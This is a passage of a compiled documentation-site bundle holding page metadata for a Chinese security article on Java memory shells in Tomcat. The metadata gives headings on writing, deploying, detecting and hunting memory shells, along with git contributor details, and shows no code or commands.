Valve内存马","slug":"tomcat-valve内存马","link":"#tomcat-valve内存马","children":[]}]},{"level":2,"title":"示例 -Tomcat-ServletAPI型内存马","slug":"示例-tomcat-servletapi型内存马","link":"#示例-tomcat-servletapi型内存马","children":[{"level":3,"title":"环境配置","slug":"环境配置","link":"#环境配置","children":[]},{"level":3,"title":"编写与部署ServletAPI型内存马","slug":"编写与部署servletapi型内存马","link":"#编写与部署servletapi型内存马","children":[]}]},{"level":2,"title":"检测与排查","slug":"检测与排查","link":"#检测与排查","children":[{"level":3,"title":"源码检测","slug":"源码检测","link":"#源码检测","children":[]},{"level":3,"title":"内存马排查","slug":"内存马排查","link":"#内存马排查","children":[]}]},{"level":2,"title":"相关链接","slug":"相关链接","link":"#相关链接","children":[]}],"git":{"createdTime":1725260536000,"updatedTime":1744860735000,"contributors":[{"name":"233Mac","username":"233Mac","email":"ayusummer233@vip.qq.com","commits":5,"url":"https://github.com/233Mac"},{"name":"233","username":"233","email":"ayusummer233@vip.qq.com","commits":18,"url":"https://github.com/233"},{"name":"233PC","username":"233PC","email":"ayusummer233@gmail.com","commits":2,"url":"https://github.com/233PC"},{"name":"ayusummer233","username":"ayusummer233","email":"ayusummer233@gmail.com","commits":1,"url":"https://github.com/ayusummer233"}]},"readingTime":{"minutes":44.22,"words":13265},"filePathRelative":"网络安全/Web安全/漏洞类型/内存马/Java内存马/index.md","localizedDate":"2024年9月2日","excerpt":"","autoDesc":true}');export{v as comp,y as data};
